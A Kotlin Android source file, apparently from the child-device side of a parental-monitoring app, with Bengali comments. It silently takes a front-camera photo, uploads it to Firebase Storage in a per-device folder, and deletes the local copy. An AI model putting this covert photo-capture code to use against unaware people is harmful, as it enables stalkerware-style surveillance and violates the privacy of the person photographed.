package com.surokkhanet.child

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.Camera
import android.net.Uri
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.io.FileOutputStream

object CameraController {
    private const val TAG = "CameraController"
    private var camera: Camera? = null

    fun takeFrontPhoto(context: Context, callback: (success: Boolean) -> Unit) {
        // ক্যামেরা ব্যবহারের অনুমতি আছে কিনা তা পরীক্ষা করা হচ্ছে
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.CAMERA
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e(TAG, "Camera permission not granted.")
            callback(false) // অনুমতি না থাকলে ব্যর্থ হয়েছে বলে জানানো হচ্ছে
            return
        }

        try {
            // ফোনের সামনের ক্যামেরা খোলা হচ্ছে
            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT)
            camera?.let { cam ->
                // ছবি তোলার জন্য ক্যামেরা প্রস্তুত করা হচ্ছে
                cam.startPreview()
                cam.takePicture(null, null) { data, cameraInstance ->
                    try {
                        // ছবিটিকে একটি ফাইলে সেভ করা হচ্ছে
                        val file = File(context.filesDir, "front_${System.currentTimeMillis()}.jpg")
                        FileOutputStream(file).use { fos ->
                            fos.write(data)
                        }
                        Log.d(TAG, "Photo saved locally: ${file.absolutePath}")

                        // ছবিটি Firebase-এ আপলোড করার জন্য ফাংশন কল করা হচ্ছে
                        uploadToFirebase(context, file, callback)

                    } catch (e: Exception) {
                        Log.e(TAG, "Error saving file: ${e.message}")
                        callback(false)
                    } finally {
                        // ক্যামেরা রিসোর্স রিলিজ করা হচ্ছে
                        cameraInstance.release()
                        camera = null
                    }
                }
            } ?: run {
                Log.e(TAG, "Front camera is not available.")
                callback(false)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error opening camera: ${e.message}")
            camera?.release()
            camera = null
            callback(false)
        }
    }

    private fun uploadToFirebase(context: Context, file: File, callback: (success: Boolean) -> Unit) {
        try {
            val storageRef = FirebaseStorage.getInstance().reference
            // প্রতিটি ডিভাইসের জন্য আলাদা ফোল্ডারে ছবি সেভ করা হচ্ছে
            val photoRef = storageRef.child("photos/${context.getDeviceId()}/${file.name}")

            photoRef.putFile(Uri.fromFile(file))
                .addOnSuccessListener {
                    Log.d(TAG, "Firebase upload successful.")
                    file.delete() // সফলভাবে আপলোড হলে ফাইলটি ডিলিট করে দেওয়া হচ্ছে
                    callback(true) // সফল হয়েছে বলে জানানো হচ্ছে
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "Firebase upload failed: ${e.message}")
                    callback(false) // ব্যর্থ হয়েছে বলে জানানো হচ্ছে
                }
        } catch (e: Exception) {
            Log.e(TAG, "Error starting upload: ${e.message}")
            callback(false)
        }
    }
}

// ডিভাইসের একটি স্বতন্ত্র আইডি (Unique ID) বের করার জন্য এই ফাংশনটি
@SuppressLint("HardwareIds")
fun Context.getDeviceId(): String {
    return Settings.Secure.getString(
        contentResolver,
        Settings.Secure.ANDROID_ID
    )
}